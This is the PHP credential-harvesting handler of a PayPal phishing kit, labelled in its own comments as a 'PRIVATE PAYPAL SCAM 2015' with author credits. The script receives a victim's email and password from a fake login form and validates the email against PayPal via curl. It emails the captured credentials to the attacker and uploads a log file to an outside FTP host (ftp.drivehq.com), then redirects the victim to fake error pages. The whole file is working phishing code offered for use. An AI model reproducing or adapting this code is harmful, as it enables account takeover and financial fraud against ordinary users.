<?php
session_start();
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/



$EM = $_POST['EM'];
$PS = $_POST['PS'];



@set_time_limit(0);

function curl($url='',$Follow=False){
    global $set;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email=dznoob@check.foryou&email=dznoob@check.foryou&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows');
    curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEFILE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR,'PP1.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
	if ($Follow !== False) {
	curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
	}
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
	ini_set("user_agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)");
	$_CheckAction = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email='.$EM.'&email=dznoob@check.foryou&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows',CURLOPT_FAILONERROR,TRUE);
	if(!strpos($_CheckAction, "region")) 
	
	{

////////////////////////////////////////////////
	if(strlen($PS) > 7  )
		{ 
	?><meta HTTP-EQUIV='REFRESH' content="0; url=login/error.php?y= <?php echo md5(rand(100, 999999999)); ?> "><?php  
		////
		$_SESSION['EM']=$EM;
		$_SESSION['PS']=$PS;

//////////////////////// SENDER INTEGRED FOR FASTER SCAMA ////////////////////////

/*

+----------------------------------+
�--- PRIVATE PAYPAL SCAM 2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben  -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/

include "option.php";
include "slog.php";
include "antibot.php";


             
///////////////////////// MAIL PART //////////////////////
		
if ( $mail > 0) {
	 mail($a, $subject, $msg);
}


///////////////////////// FTP PART //////////////////////


if ( $ftp > 0)
{


$datamasii=date("D M d, Y");
$name="./resl/DzNOoB-{$_SERVER['HTTP_HOST']}-{$datamasii}.txt";		
$file = fopen($name,"a");
fputs($file,$msg);
fclose($file);
$namenodir="DzNOoB-{$_SERVER['HTTP_HOST']}-{$datamasii}.txt";	
$ftp_server="ftp.drivehq.com";
$conn_id = ftp_connect($ftp_server);
$login_result = ftp_login($conn_id, $b, $c);
$namenodir=
$upload = ftp_put($conn_id, $namenodir, $name, FTP_BINARY); 
ftp_close($conn_id);







}
///////////////////////// Done //////////////////////

		}
		
		else


		
		{

date_default_timezone_set('GMT');
$line = date('Y-m-d H:i:s') . " - $_POST[EM]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);

	?><meta HTTP-EQUIV='REFRESH' content="0; url=login/Err.php?loginError_id=c <?php echo md5(rand(100, 999999999)); ?> 15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"><?php  
		}	 
////////////////////////////////////////////////

	} 

	else
 

	{
date_default_timezone_set('GMT');
$line = date('Y-m-d H:i:s') . " - $_POST[EM]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);

	
	?><meta HTTP-EQUIV='REFRESH' content="0; url=login/Err.php?loginError_id=c3Fauth <?php echo md5(rand(100, 999999999)); ?> 2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"><?php  
	
	}

?>